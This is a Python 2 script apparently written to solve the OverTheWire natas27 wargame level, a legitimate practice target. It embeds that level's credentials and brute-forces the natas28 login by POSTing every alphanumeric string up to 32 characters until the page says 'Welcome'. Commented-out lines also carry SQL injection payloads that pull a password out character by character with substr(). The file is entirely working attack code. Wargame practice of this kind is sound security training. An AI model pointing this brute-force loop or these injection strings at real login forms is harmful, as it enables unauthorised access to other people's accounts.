from StringIO import StringIO
import itertools
import pycurl
import re
import sys

try:
    # python 3
    from urllib.parse import urlencode
except ImportError:
    # python 2
    from urllib import urlencode


def bruteforce(charset, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(1, maxlength + 1)))

def check_password(word):
	c = pycurl.Curl()
	c.setopt(c.URL, 'http://natas27.natas.labs.overthewire.org/index.php')
	c.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_BASIC)
	c.setopt(pycurl.USERPWD, "%s:%s" % ('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ'))

	post_data = {'username': 'natas28', 'password': word}
	# post_data = {'username': 'natas16" and substr(password, %d, 1)="%s' % (position, letter)}
	# post_data = {'username': 'natas16'}
	# post_data = {'username': 'natas16" and substr(password, 0, 1)="a'}
	# Form data must be provided already urlencoded.
	postfields = urlencode(post_data)
	# Sets request method to POST,
	# Content-Type header to application/x-www-form-urlencoded
	# and data to send in request body.
	c.setopt(c.POSTFIELDS, postfields)

	# set buffer for data
	buffer = StringIO()
	c.setopt(c.WRITEDATA, buffer)

	# execute
	c.perform()
	c.close()

	# retrieve content from buffer.
	body = buffer.getvalue()

	if "Welcome" in body:
		return True

	return False

password = False

while True:
	for word in bruteforce('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 32):
		sys.stdout.write('\rChecking "%s"' % word);
		sys.stdout.flush()
		if check_password(word):
			password = word
			break

print "\n"

if password == False:
	print "[FAIL!]"
	sys.exit(1)
else:
	print "[FOUND!] The password is: %s" % password
	sys.exit(0)